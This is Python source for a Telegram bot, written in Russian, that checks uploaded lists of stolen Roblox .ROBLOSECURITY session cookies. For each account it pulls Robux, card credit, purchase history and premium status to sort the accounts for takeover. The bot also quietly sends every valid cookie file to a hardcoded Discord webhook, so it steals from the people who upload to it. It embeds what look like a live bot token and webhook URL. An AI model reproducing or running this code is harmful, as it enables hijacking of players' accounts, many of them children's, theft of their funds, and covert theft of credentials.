import requests
import random
import os
import re
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.utils import executor

API_URLS = {
    "friend_requests": 'https://friends.roblox.com/v1/user/friend-requests/count',
    "auth_user": 'https://users.roblox.com/v1/users/authenticated',
    "currency": 'https://economy.roblox.com/v1/users/{user_id}/currency',
    "billing": 'https://billing.roblox.com/v1/credit',
    "account_settings": 'https://www.roblox.com/my/settings/json',
    "transactions": 'https://economy.roblox.com/v2/users/{user_id}/transaction-totals?timeFrame=Year&transactionType=summary'
}

bot = Bot(token="7362435959:AAHiqdHx-9ZDEPtBB3_euxWYIi46c-nt1Dk")  # Укажите ваш токен бота здесь
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

@dp.message_handler(commands=["start"])
async def start_command(message: types.Message):
    await message.reply("Привет! Куки чекер сделан @xxyww2. Пожалуйста, отправьте файл с куками в формате .txt")

def is_cookie_valid(session, cookie_line):
    response = session.get(API_URLS["friend_requests"], cookies={'.ROBLOSECURITY': cookie_line})
    return response.status_code == 200

def get_user_id(session, cookie_line):
    response = session.get(API_URLS["auth_user"], cookies={'.ROBLOSECURITY': cookie_line})
    if response.status_code == 200:
        return response.json().get('id')
    return None

def get_account_info(session, cookie_line):
    response = session.get(API_URLS["account_settings"], cookies={'.ROBLOSECURITY': cookie_line})
    if response.status_code == 200:
        account_data = response.json()
        return {
            "name": account_data['Name'],
            "email_verified": account_data['IsEmailVerified'],
            "account_age_in_years": round(float(account_data['AccountAgeInDays'] / 365), 2),
            "has_premium": account_data['IsPremium']
        }
    return None

def get_credit_balance(session, cookie_line):
    response = session.get(API_URLS["billing"], cookies={'.ROBLOSECURITY': cookie_line})
    if response.status_code == 200:
        return response.json().get('amount', 0)
    return 0

def get_robux(session, user_id, cookie_line):
    response = session.get(API_URLS["currency"].format(user_id=user_id), cookies={'.ROBLOSECURITY': cookie_line})
    if response.status_code == 200:
        return response.json().get('robux', 0)
    return 0

def get_account_transactions(session, user_id, cookie_line):
    response = session.get(API_URLS["transactions"].format(user_id=user_id), cookies={'.ROBLOSECURITY': cookie_line})
    if response.status_code == 200:
        data = response.json()
        return abs(data.get('purchasesTotal', 0)), data.get('pendingTotal', 0)
    return 0

def check_cookies(cookie_line):
    session = requests.Session()
    if not is_cookie_valid(session, cookie_line):
        return {"valid": False}
    user_id = get_user_id(session, cookie_line)
    if not user_id:
        return {"valid": False}
    account_info = get_account_info(session, cookie_line)
    if account_info is None:
        return {"valid": False}
    credit_balance = get_credit_balance(session, cookie_line)
    robux = get_robux(session, user_id, cookie_line)
    total_purchases, pending_robux = get_account_transactions(session, user_id, cookie_line)

    return {
        "valid": True,
        "data": {
            "robux": robux,
            "credit_balance": credit_balance,
            "account_purchases_total": total_purchases,
            "account_pending_robux": pending_robux,
            "account_name": account_info['name'],
            "account_email_verified": account_info['email_verified'],
            "account_age_in_years": account_info['account_age_in_years'],
            "account_has_premium": account_info['has_premium'],
            "cookie": cookie_line
        }
    }

@dp.message_handler(content_types=['document'])
async def handle_file(message: types.Message):
    document = message.document
    temp_cookie_file = 'temp_cookies.txt'
    cookie_file = 'cookies.txt'

    if os.path.exists(cookie_file):
        os.remove(cookie_file)

    await document.download(temp_cookie_file)
    os.rename(temp_cookie_file, cookie_file)

    await message.reply("Ожидайте проверки...")

    valid_cookies = []
    total_robux = 0
    total_credit = 0
    total_purchases = 0
    total_pending_robux = 0

    cookie_pattern = re.compile(r'Cookie:\s*(.*)')

    with open(cookie_file) as f:
        for line in f:
            line = line.strip()
            if not line:
                continue

            match = cookie_pattern.search(line)
            if match:
                cookie_line = match.group(1).strip()
                result = check_cookies(cookie_line)
                if result["valid"]:
                    valid_cookies.append(format_valid_cookie(result))
                    total_robux += result['data']['robux']
                    total_credit += result['data']['credit_balance']
                    total_purchases += result['data']['account_purchases_total']
                    total_pending_robux += result['data']['account_pending_robux']

    if valid_cookies:
        await process_valid_cookies(message, valid_cookies, total_robux, total_pending_robux, total_purchases, total_credit)
    else:
        await message.reply("Куки в файле недействительны.")

def format_valid_cookie(result):
    return (
        f"Nickname: {result['data']['account_name']} | Robux: {result['data']['robux']} R$ | "
        f"Pending: {result['data']['account_pending_robux']} R$ | Card: {result['data']['credit_balance']} USD | "
        f"Total: {abs(result['data']['account_purchases_total'])} R$ | "
        f"Email: {'True' if result['data']['account_email_verified'] else 'False'} | "
        f"Age: {result['data']['account_age_in_years']} years | "
        f"Premium: {result['data']['account_has_premium']} | Cookie: {result['data']['cookie']}\n"
    )

async def process_valid_cookies(message, valid_cookies, total_robux, total_pending_robux, total_purchases, total_credit):
    random_number = random.randint(10000000, 99999999)
    valid_filename = f'valid_cookies_{random_number}.txt'

    with open(valid_filename, 'w') as valid_file:
        valid_file.write("\n".join(valid_cookies))

    await message.reply("Валидация куков завершена. Файл с валидными куками готов к загрузке.")

    # Отправка файла пользователю
    with open(valid_filename, 'rb') as valid_file:
        await bot.send_document(message.chat.id, valid_file)

    # Отправка в Discord
    send_to_discord(valid_filename)

    os.remove(valid_filename)

    await message.reply(
        f"Robux: {total_robux} R$\n"
        f"Pending: {total_pending_robux} R$\n"
        f"Total Purchases: {total_purchases} R$\n"
        f"Card Balance: {total_credit} USD"
    )

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1300470269365846076/vyZNOuOcS6scdxgF7S7j5GbjgDGeDFo2ADb3ejlOvh2phHKE-lH0hXD2hlVATnSEzvPp"  # Замените на свой URL вебхука

def send_to_discord(filename):
    with open(filename, 'rb') as file:
        payload = {
            "content": "Валидация куков завершена. Файл с валидными куками готов к загрузке."
        }
        files = {
            "file": file
        }
        requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)

if __name__ == '__main__':
    try:
        executor.start_polling(dp, skip_updates=True)
    except Exception as e:
        print(f"An error occurred: {e}")